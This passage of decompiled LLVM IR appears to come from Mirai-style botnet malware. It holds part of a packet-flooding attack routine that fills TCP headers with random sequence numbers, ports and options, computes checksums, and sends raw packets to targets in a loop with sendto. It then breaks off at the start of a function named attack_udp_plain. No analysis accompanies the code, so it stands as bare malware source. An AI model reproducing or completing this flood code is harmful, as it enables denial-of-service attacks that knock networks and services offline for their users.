  %v2_b314 = inttoptr i32 %v1_b314 to i8*
  %v3_b314 = load i8, i8* %v2_b314, align 1
  %v4_b314 = zext i8 %v3_b314 to i32
  store i32 %v1_b200, i32* %r0.global-to-local, align 4
  %v1_b31c = and i32 %v4_b314, 251
  %v5_b320 = or i32 %v1_b31c, %v4_b320
  store i32 %v5_b320, i32* %r3.global-to-local, align 4
  %v1_b324 = trunc i32 %v5_b320 to i8
  store i8 %v1_b324, i8* %v2_b314, align 1
  %v0_b328 = load i32, i32* %r1.global-to-local, align 4
  %v1_b328 = add i32 %v0_b328, 13
  %v2_b328 = inttoptr i32 %v1_b328 to i8*
  %v3_b328 = load i8, i8* %v2_b328, align 1
  %v4_b328 = zext i8 %v3_b328 to i32
  store i32 %v1_b204, i32* %r3.global-to-local, align 4
  %v1_b330 = and i32 %v4_b328, 253
  %v4_b334 = or i32 %v1_b330, %v3_b334
  store i32 %v4_b334, i32* %r2.global-to-local, align 4
  %v1_b338 = trunc i32 %v4_b334 to i8
  store i8 %v1_b338, i8* %v2_b328, align 1
  %v0_b33c = load i32, i32* %r1.global-to-local, align 4
  %v1_b33c = add i32 %v0_b33c, 13
  %v2_b33c = inttoptr i32 %v1_b33c to i8*
  %v3_b33c = load i8, i8* %v2_b33c, align 1
  %v4_b33c = zext i8 %v3_b33c to i32
  store i32 %v1_b208, i32* %r0.global-to-local, align 4
  %v1_b344 = and i32 %v4_b33c, 254
  %v2_b348 = or i32 %v1_b344, %v1_b208
  store i32 %v2_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = trunc i32 %v2_b348 to i8
  store i8 %v1_b34c, i8* %v2_b33c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 40
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 2, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 41
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = call i32 @rand_next()
  %v1_b364 = urem i32 %v0_b360, 16
  %v1_b368 = or i32 %v1_b364, 1392
  %tmp66 = mul nuw nsw i32 %v1_b368, 256
  %v3_b374 = add nuw nsw i32 %tmp66, 2048
  %v5_b37c = or i32 %v3_b374, 5
  %v1_b380 = trunc i32 %v5_b37c to i16
  %v2_b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_b380 = add i32 %v2_b380, 42
  %v4_b380 = inttoptr i32 %v3_b380 to i16*
  store i16 %v1_b380, i16* %v4_b380, align 2
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 44
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 4, i8* %v4_b388, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_b398 = add i32 %v2_b398, 46
  %v4_b398 = inttoptr i32 %v3_b398 to i8*
  store i8 8, i8* %v4_b398, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b39c to i8
  %v2_b39c = load i32, i32* %r4.global-to-local, align 4
  %v3_b39c = add i32 %v2_b39c, 47
  %v4_b39c = inttoptr i32 %v3_b39c to i8*
  store i8 %v1_b39c, i8* %v4_b39c, align 1
  %v0_b3a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i8
  %v2_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 45
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i8*
  store i8 %v1_b3a0, i8* %v4_b3a0, align 1
  %v0_b3a4 = call i32 @rand_next()
  store i32 %v0_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b3ac = add i32 %v2_b3ac, 59
  %v4_b3ac = inttoptr i32 %v3_b3ac to i8*
  store i8 6, i8* %v4_b3ac, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* %r4.global-to-local, align 4
  %v2_b3bc = add i32 %v1_b3bc, 48
  %v3_b3bc = inttoptr i32 %v2_b3bc to i32*
  store i32 %v0_b3a4, i32* %v3_b3bc, align 4
  %v0_b3c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b3c0 = add i32 %v1_b3c0, 52
  %v3_b3c0 = inttoptr i32 %v2_b3c0 to i32*
  store i32 %v0_b3c0, i32* %v3_b3c0, align 4
  %v0_b3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3c4 = trunc i32 %v0_b3c4 to i8
  %v2_b3c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c4 = add i32 %v2_b3c4, 56
  %v4_b3c4 = inttoptr i32 %v3_b3c4 to i8*
  store i8 %v1_b3c4, i8* %v4_b3c4, align 1
  %v0_b3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 58
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b3cc = add i32 %v2_b3cc, 57
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v3_b3d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3d0, i32* %r3.global-to-local, align 4
  %v1_b3d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b3d4 = add i32 %v1_b3d4, %v3_b3d0
  store i32 %v2_b3d4, i32* @r4, align 4
  %v1_b3d8 = load i32, i32* @r7, align 4
  %v9_b3d8 = icmp eq i32 %v2_b3d4, %v1_b3d8
  store i1 %v9_b3d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b3d4, i32* %stack_var_-44, align 4
  %v5_b3e0 = icmp slt i32 %v2_b3d4, %v1_b3d8
  br i1 %v5_b3e0, label %dec_label_pc_b228, label %dec_label_pc_b3e4.preheader

dec_label_pc_b3e4.preheader:                      ; preds = %bb61, %dec_label_pc_b158
  %v0_b3e86 = phi i32 [ 0, %dec_label_pc_b158 ], [ %v1_b3d8, %bb61 ]
  %v3_b560 = icmp eq i32 %v6_b10c, -1
  %v8_b560 = icmp eq i32 %v6_b10c, -1
  %v9_b430 = icmp eq i32 %v3_b174, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4, %dec_label_pc_b3e4.preheader
  %v0_b3e8 = phi i32 [ %v0_b3e86, %dec_label_pc_b3e4.preheader ], [ 0, %dec_label_pc_b4f4 ], [ 0, %dec_label_pc_b3e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3e8 = icmp eq i32 %v0_b3e8, 0
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b470, %dec_label_pc_b3f4
  %v1_b408 = phi i32 [ %v1_b4e4, %dec_label_pc_b470 ], [ 0, %dec_label_pc_b3f4 ]
  %v5_b3fc = mul i32 %v1_b408, 24
  %v1_b400 = load i32, i32* @r8, align 4
  %v2_b400 = add i32 %v1_b400, %v5_b3fc
  store i32 %v2_b400, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v2_b400, 20
  %v2_b404 = inttoptr i32 %v1_b404 to i8*
  %v3_b404 = load i8, i8* %v2_b404, align 1
  %v4_b404 = zext i8 %v3_b404 to i32
  store i32 %v4_b404, i32* %r2.global-to-local, align 4
  %v0_b408 = load i32, i32* @sb, align 4
  %v4_b408 = mul i32 %v1_b408, 4
  %v5_b408 = add i32 %v0_b408, %v4_b408
  %v6_b408 = inttoptr i32 %v5_b408 to i32*
  %v7_b408 = load i32, i32* %v6_b408, align 4
  store i32 %v7_b408, i32* @r5, align 4
  %v7_b40c = icmp eq i8 %v3_b404, 31
  store i1 %v7_b40c, i1* %cpsr_z.global-to-local, align 1
  %v1_b410 = add i32 %v7_b408, 20
  store i32 %v1_b410, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b404, 32
  br i1 %tmp67, label %dec_label_pc_b508, label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3f8
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_b430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b430, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b438:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v1_b43c = phi i32 [ %v1_b578, %dec_label_pc_b568 ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_b424 ]
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v9_b43c = icmp eq i32 %v3_b178, %v1_b43c
  store i1 %v9_b43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b43c, label %dec_label_pc_b598, label %dec_label_pc_b444

dec_label_pc_b444:                                ; preds = %dec_label_pc_b584.dec_label_pc_b444_crit_edge, %dec_label_pc_b438
  %v1_b448 = phi i32 [ %v1_b448.pre, %dec_label_pc_b584.dec_label_pc_b444_crit_edge ], [ %v1_b43c, %dec_label_pc_b438 ]
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v9_b448 = icmp eq i32 %v3_b17c, %v1_b448
  store i1 %v9_b448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b448, label %dec_label_pc_b5ac, label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b598.dec_label_pc_b450_crit_edge, %dec_label_pc_b444
  %v1_b454 = phi i32 [ %v1_b454.pre, %dec_label_pc_b598.dec_label_pc_b450_crit_edge ], [ %v1_b448, %dec_label_pc_b444 ]
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v9_b454 = icmp eq i32 %v6_b048, %v1_b454
  store i1 %v9_b454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b454, label %dec_label_pc_b5c0, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge, %dec_label_pc_b450
  %v1_b460 = phi i32 [ %v1_b460.pre, %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge ], [ %v1_b454, %dec_label_pc_b450 ]
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v9_b460 = icmp eq i32 %v6_b060, %v1_b460
  store i1 %v9_b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b460, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b468 = load i32, i32* @fp, align 4
  %v2_b468 = icmp eq i32 %v0_b468, 0
  store i1 %v2_b468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b468, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b470:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4, %dec_label_pc_b5e4
  %v2_b474 = load i32, i32* @r5, align 4
  %v3_b474 = add i32 %v2_b474, 10
  %v4_b474 = inttoptr i32 %v3_b474 to i16*
  store i16 0, i16* %v4_b474, align 2
  %v0_b478 = load i32, i32* @r5, align 4
  store i32 %v0_b478, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b480 = call i32 @checksum_generic(i32 %v0_b478, i32 20)
  %v3_b480 = trunc i32 %v2_b480 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b488 = load i32, i32* @r5, align 4
  %v4_b488 = add i32 %v3_b488, 10
  %v5_b488 = inttoptr i32 %v4_b488 to i16*
  store i16 %v3_b480, i16* %v5_b488, align 2
  %v0_b48c = load i32, i32* @r6, align 4
  store i32 %v0_b48c, i32* @r1, align 4
  %v0_b490 = load i32, i32* %r2.global-to-local, align 4
  %v1_b490 = trunc i32 %v0_b490 to i16
  %v3_b490 = add i32 %v0_b48c, 16
  %v4_b490 = inttoptr i32 %v3_b490 to i16*
  store i16 %v1_b490, i16* %v4_b490, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = call i32 @checksum_tcpudp(i32 %v0_b49c, i32 %v0_b48c, i32 10240, i32 40)
  %v5_b4a0 = trunc i32 %v4_b4a0 to i16
  store i32 %v4_b4a0, i32* %r0.global-to-local, align 4
  %v3_b4a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a4, i32* %r3.global-to-local, align 4
  %v3_b4a8 = mul i32 %v3_b4a4, 32
  store i32 %v3_b4a8, i32* %lr.global-to-local, align 4
  %v3_b4ac = load i32, i32* @r6, align 4
  %v4_b4ac = add i32 %v3_b4ac, 16
  %v5_b4ac = inttoptr i32 %v4_b4ac to i16*
  store i16 %v5_b4a0, i16* %v5_b4ac, align 2
  %v0_b4b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b4b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b4b0, -8
  %v5_b4b0 = add i32 %v0_b4b0, %tmp68
  store i32 %v5_b4b0, i32* %lr.global-to-local, align 4
  %v0_b4b4 = load i32, i32* @r6, align 4
  %v1_b4b4 = add i32 %v0_b4b4, 2
  %v2_b4b4 = inttoptr i32 %v1_b4b4 to i16*
  %v3_b4b4 = load i16, i16* %v2_b4b4, align 2
  %v4_b4b4 = zext i16 %v3_b4b4 to i32
  store i32 %v4_b4b4, i32* @r6, align 4
  %v1_b4b8 = load i32, i32* @r8, align 4
  %v2_b4b8 = add i32 %v1_b4b8, %v5_b4b0
  store i32 %v2_b4b8, i32* @lr, align 4
  %v3_b4bc = add i32 %v2_b4b8, 2
  %v4_b4bc = inttoptr i32 %v3_b4bc to i16*
  store i16 %v3_b4b4, i16* %v4_b4bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  store i32 %v0_b4c8, i32* %r1.global-to-local, align 4
  %v0_b4cc = load i32, i32* @sl, align 4
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @lr, align 4
  %v6_b4dc = call i32 @__libc_sendto(i32 %v0_b4cc, i32 %v0_b4c8, i32 60, i32 16384, i32 %v0_b4d4, i32 16)
  %v3_b4e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4e0, i32* %r3.global-to-local, align 4
  %v1_b4e4 = add i32 %v3_b4e0, 1
  store i32 %v1_b4e4, i32* %r0.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r7, align 4
  %v9_b4e8 = icmp eq i32 %v1_b4e4, %v1_b4e8
  store i1 %v9_b4e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4e4, i32* %stack_var_-44, align 4
  %v5_b4f0 = icmp slt i32 %v1_b4e4, %v1_b4e8
  br i1 %v5_b4f0, label %dec_label_pc_b3f8, label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b470
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4f8 = icmp eq i32 %v1_b4e8, 0
  store i1 %v2_b4f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4f8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b508:                                ; preds = %dec_label_pc_b3f8
  %v1_b508 = add i32 %v2_b400, 16
  %v2_b508 = inttoptr i32 %v1_b508 to i32*
  %v3_b508 = load i32, i32* %v2_b508, align 4
  store i32 %v3_b508, i32* %r4.global-to-local, align 4
  %v0_b50c = call i32 @rand_next()
  store i32 %v0_b50c, i32* %r0.global-to-local, align 4
  %v3_b510 = load i32, i32* %stack_var_-44, align 4
  %v5_b518 = mul i32 %v3_b510, 24
  %v0_b51c = load i32, i32* %r4.global-to-local, align 4
  %v1_b51c = and i32 %v0_b51c, 16711680
  %v3_b520 = udiv i32 %v0_b51c, 16777216
  %v4_b524 = udiv i32 %v1_b51c, 256
  %v5_b524 = or i32 %v4_b524, %v3_b520
  store i32 %v5_b524, i32* %r2.global-to-local, align 4
  %v1_b528 = load i32, i32* @r8, align 4
  %v2_b528 = add i32 %v1_b528, %v5_b518
  store i32 %v2_b528, i32* %r1.global-to-local, align 4
  %v1_b52c = and i32 %v0_b51c, 65280
  store i32 %v1_b52c, i32* %r3.global-to-local, align 4
  %v1_b530 = add i32 %v2_b528, 20
  %v2_b530 = inttoptr i32 %v1_b530 to i8*
  %v3_b530 = load i8, i8* %v2_b530, align 1
  %v4_b530 = zext i8 %v3_b530 to i32
  %v5_b538 = call i32 @llvm.bswap.i32(i32 %v0_b51c)
  %v7_b53c = lshr i32 %v0_b50c, %v4_b530
  %v8_b53c = add i32 %v7_b53c, %v5_b538
  store i32 %v8_b53c, i32* %r2.global-to-local, align 4
  %v1_b540 = and i32 %v8_b53c, 16711680
  store i32 %v1_b540, i32* %r0.global-to-local, align 4
  %v1_b54c = and i32 %v8_b53c, 65280
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v5_b554 = call i32 @llvm.bswap.i32(i32 %v8_b53c)
  %v1_b558 = load i32, i32* @r5, align 4
  %v2_b558 = add i32 %v1_b558, 16
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v5_b554, i32* %v3_b558, align 4
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b568:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  %v0_b568 = call i32 @rand_next()
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r4.global-to-local, align 4
  %v1_b570 = load i32, i32* @r5, align 4
  %v2_b570 = add i32 %v1_b570, 12
  %v3_b570 = inttoptr i32 %v2_b570 to i32*
  store i32 %v0_b568, i32* %v3_b570, align 4
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  %v0_b578 = load i32, i32* %r4.global-to-local, align 4
  %v1_b578 = add i32 %v0_b578, -1
  store i32 %v1_b578, i32* @r4, align 4
  %v9_b57c = icmp eq i32 %v3_b174, %v1_b578
  store i1 %v9_b57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b57c, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b584:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v0_b584 = call i32 @rand_next()
  %v1_b584 = trunc i32 %v0_b584 to i16
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v3_b178, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  %v3_b590 = load i32, i32* @r5, align 4
  %v4_b590 = add i32 %v3_b590, 4
  %v5_b590 = inttoptr i32 %v4_b590 to i16*
  store i16 %v1_b584, i16* %v5_b590, align 2
  br i1 %v9_b58c, label %dec_label_pc_b598, label %dec_label_pc_b584.dec_label_pc_b444_crit_edge

dec_label_pc_b584.dec_label_pc_b444_crit_edge:    ; preds = %dec_label_pc_b584
  %v1_b448.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b444

dec_label_pc_b598:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b438
  %v0_b598 = call i32 @rand_next()
  %v1_b598 = trunc i32 %v0_b598 to i16
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v1_b5a0 = load i32, i32* @r4, align 4
  %v9_b5a0 = icmp eq i32 %v3_b17c, %v1_b5a0
  store i1 %v9_b5a0, i1* %cpsr_z.global-to-local, align 1
  %v3_b5a4 = load i32, i32* @r5, align 4
  %v4_b5a4 = add i32 %v3_b5a4, 20
  %v5_b5a4 = inttoptr i32 %v4_b5a4 to i16*
  store i16 %v1_b598, i16* %v5_b5a4, align 2
  br i1 %v9_b5a0, label %dec_label_pc_b5ac, label %dec_label_pc_b598.dec_label_pc_b450_crit_edge

dec_label_pc_b598.dec_label_pc_b450_crit_edge:    ; preds = %dec_label_pc_b598
  %v1_b454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b450

dec_label_pc_b5ac:                                ; preds = %dec_label_pc_b598, %dec_label_pc_b444
  %v0_b5ac = call i32 @rand_next()
  %v1_b5ac = trunc i32 %v0_b5ac to i16
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v1_b5b4 = load i32, i32* @r4, align 4
  %v9_b5b4 = icmp eq i32 %v6_b048, %v1_b5b4
  store i1 %v9_b5b4, i1* %cpsr_z.global-to-local, align 1
  %v3_b5b8 = load i32, i32* @r6, align 4
  %v4_b5b8 = add i32 %v3_b5b8, 2
  %v5_b5b8 = inttoptr i32 %v4_b5b8 to i16*
  store i16 %v1_b5ac, i16* %v5_b5b8, align 2
  br i1 %v9_b5b4, label %dec_label_pc_b5c0, label %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge

dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge:    ; preds = %dec_label_pc_b5ac
  %v1_b460.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b45c

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b5ac, %dec_label_pc_b450
  %v0_b5c0 = call i32 @rand_next()
  %v1_b5c4 = load i32, i32* @r6, align 4
  %v2_b5c4 = add i32 %v1_b5c4, 4
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  store i32 %v0_b5c0, i32* %v3_b5c4, align 4
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @r4, align 4
  %v9_b5cc = icmp eq i32 %v6_b060, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5cc, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b5d4 = call i32 @rand_next()
  store i32 %v0_b5d4, i32* %r0.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @fp, align 4
  %v2_b5d8 = icmp eq i32 %v0_b5d8, 0
  store i1 %v2_b5d8, i1* %cpsr_z.global-to-local, align 1
  %v1_b5dc = load i32, i32* @r6, align 4
  %v2_b5dc = add i32 %v1_b5dc, 8
  %v3_b5dc = inttoptr i32 %v2_b5dc to i32*
  store i32 %v0_b5d4, i32* %v3_b5dc, align 4
  br i1 %v2_b5d8, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4
  %v0_b5e4 = call i32 @rand_next()
  %v1_b5e4 = trunc i32 %v0_b5e4 to i16
  store i32 %v0_b5e4, i32* %r0.global-to-local, align 4
  %v3_b5e8 = load i32, i32* @r6, align 4
  %v4_b5e8 = add i32 %v3_b5e8, 18
  %v5_b5e8 = inttoptr i32 %v4_b5e8 to i16*
  store i16 %v1_b5e4, i16* %v5_b5e8, align 2
  br label %dec_label_pc_b470

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b130
  %v0_b5f0 = load i32, i32* @sl, align 4
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v1_b5f4 = call i32 @__GI___libc_close(i32 %v0_b5f0)
  store i32 %v1_b5f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %entry, %dec_label_pc_b5f0
  %v1_b600 = phi i32 [ %v3_b120, %entry ], [ %v1_b5f4, %dec_label_pc_b5f0 ]
  store i32 %v3_af5c, i32* %r4.global-to-local, align 4
  store i32 %v24_af5c, i32* %fp.global-to-local, align 4
  store i32 %v27_af5c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b600

; uselistorder directives
  uselistorder i32 %v0_b5e4, { 1, 0 }
  uselistorder i32 %v0_b5ac, { 1, 0 }
  uselistorder i32 %v0_b598, { 1, 0 }
  uselistorder i32 %v0_b584, { 1, 0 }
  uselistorder i32 %v1_b578, { 1, 2, 0 }
  uselistorder i32 %v0_b51c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b4e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b4b0, { 1, 0 }
  uselistorder i32 %v4_b4a0, { 1, 0 }
  uselistorder i32 %v2_b3d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b23c, { 1, 2, 0 }
  uselistorder i32 %v1_b208, { 2, 1, 0 }
  uselistorder i32 %v1_b204, { 2, 0, 1 }
  uselistorder i32 %v1_b200, { 2, 0, 1 }
  uselistorder i32 %v1_b1fc, { 2, 0, 1 }
  uselistorder i32 %v1_b1d8, { 1, 0 }
  uselistorder i32 %v3_b174, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_b168, { 1, 0, 2 }
  uselistorder i32 %v0_b164, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b150, { 1, 0 }
  uselistorder i1 %v7_b124, { 1, 0 }
  uselistorder i32 %v3_b120, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b10c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b060, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_b048, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_afd4, { 1, 0 }
  uselistorder i32 %v6_afcc, { 1, 0 }
  uselistorder i32 %v7_afb4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b470, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
